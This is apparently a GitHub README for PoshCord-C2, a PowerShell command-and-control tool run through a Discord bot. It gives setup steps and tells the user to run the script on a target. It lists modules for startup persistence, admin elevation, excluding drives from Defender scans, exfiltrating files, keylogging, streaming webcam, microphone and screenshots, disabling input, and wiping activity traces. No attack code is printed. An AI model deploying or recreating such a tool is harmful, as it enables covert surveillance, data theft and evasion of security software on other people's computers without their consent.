# PoshCord-C2

**SYNOPSIS**

Using a Discord bot along with discords API and Powershell to Act as a Command and Control Platform.

**INFORMATION**

This script uses a discord bot along with discords API to create a server channel that can control a windows pc.
Every 10 seconds it will check for a new message in chat and interpret it as a custom command / module in powershell.

**Demo** (using .vbs stager and python bot)

![GIF 3-14-2024 7-18-11 PM](https://github.com/beigeworm/PoshCord-C2/assets/93350544/d1805cf3-f850-45c1-b4d2-c342cc17ecdb)

**SETUP**
1. Make a discord bot at https://discord.com/developers/applications/
2. Turn on ALL intents in the 'Bot' tab.

![image](https://github.com/beigeworm/PoshCord-C2/assets/93350544/f4b381b1-9217-4469-90de-e913681aecd6)

3. Give these permissions in Oauth2 tab and copy link into a browser url bar

![Screenshot_1](https://github.com/beigeworm/PoshCord-C2/assets/93350544/1c944403-b4b0-4730-bc53-c958f4082ef9)

4. add the bot to your discord server
5. Click 'Reset Token' in "Bot" tab for your token
6. Change $tk below with your bot token

**USAGE**
1. Setup the script
2. Run the script on a target.
3. Check discord for new channels created.
5. The session will be started in a newly created channel category 
6. Use the commands listed below in 'session-control' channel

**MODULES / COMMANDS**

*Write these in 'session-control' channel to run on the target.*

-SYSTEM
- **AddPersistance**: Add this script to startup.
- **RemovePersistance**: Remove Poshcord from startup
- **IsAdmin**: Check if the session is admin
- **Elevate**: Attempt to restart script as admin (!user popup!)
- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
- **EnableIO**: Enable Keyboard and Mouse (admin only)
- **DisableIO**: Disable Keyboard and Mouse (admin only)
- **Exfiltrate**: Send various files. (see ExtraInfo)
- **Upload**: Upload a file. (see ExtraInfo)
- **Download**: Download a file. (attach a file with the command)
- **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
- **SpeechToText**: Send audio transcript to Discord
- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
- **NearbyWifi**: Show nearby wifi networks (!user popup!)
- **RecordScreen**: Record Screen and send to Discord

-PRANKS
- **FakeUpdate**: Spoof Windows-10 update screen using Chrome
- **Windows93**: Start parody Windows93 using Chrome
- **WindowsIdiot**: Start fake Windows95 using Chrome
- **SendHydra**: Never ending popups (use killswitch) to stop
- **SoundSpam**: Play all Windows default sounds on the target
- **Message**: Send a message window to the User (!user popup!)
- **VoiceMessage**: Send a message window to the User (!user popup!)
- **MinimizeAll**: Send a voice message to the User
- **EnableDarkMode**: Enable System wide Dark Mode
- **DisableDarkMode**: Disable System wide Dark Mode
- **ShortcutBomb**: Create 50 shortcuts on the desktop.
- **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
- **Goose**: Spawn an annoying goose (Sam Pearson App)
- **ScreenParty**: Start A Disco on screen!
  
-JOBS
- **Microphone**: Record microphone clips and send to Discord
- **Webcam**: Stream webcam pictures to Discord
- **Screenshots**: Sends screenshots of the desktop to Discord
- **Keycapture**: Capture Keystrokes and send to Discord
- **SystemInfo**: Gather System Info and send to Discord

-CONTROL
- **ExtraInfo**: Get a list of further info and command examples
- **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
- **Kill**: Stop a running module (eg. Exfiltrate)
- **PauseJobs**: Pause the current jobs for this session
- **Close**: Close this session

**FEATURES**

**Custom Scripting**

You can add custom scripting / commands - Type 'YOUR CUSTOM POWERSHELL COMMAND' in chat

**Killswitch**

Save a hosted file contents as 'kill' to stop 'KeyCapture' or 'Exfiltrate' command and return to waiting for commands.

**UVNC Listener / Server**
Zip File - https://github.com/wormserv/assets/raw/main/uvnc-server.zip
